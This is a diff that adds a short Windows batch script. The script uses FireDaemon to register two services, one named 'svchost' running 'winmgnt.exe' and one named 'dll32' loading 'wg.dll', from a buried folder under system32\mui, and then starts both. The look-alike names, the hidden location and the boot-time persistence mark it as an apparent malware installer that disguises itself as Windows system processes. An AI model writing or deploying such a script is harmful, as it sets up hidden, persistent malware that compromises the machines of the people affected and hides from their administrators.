@@ -1,0 +1,8 @@
+@echo off
+set mxbin=c:\winnt\system32\mui\dispspec\temp
+set mxhome=c:\winnt\system32\mui\dispspec\temp
+cd c:\winnt\system32\mui\dispspec\temp\
+firedaemon -i svchost "c:\winnt\system32\mui\dispspec\temp" "c:\winnt\system32\mui\dispspec\temp\winmgnt.exe" "/h" Y 0 0 Y Y
+firedaemon -i dll32 "c:\winnt\system32\mui\dispspec\temp" "c:\winnt\system32\mui\dispspec\temp\dll32.exe" "c:\winnt\system32\mui\dispspec\temp\\wg.dll" Y 0 0 Y Y
+c:\winnt\system32\net start dll32
+c:\winnt\system32\net start svchost
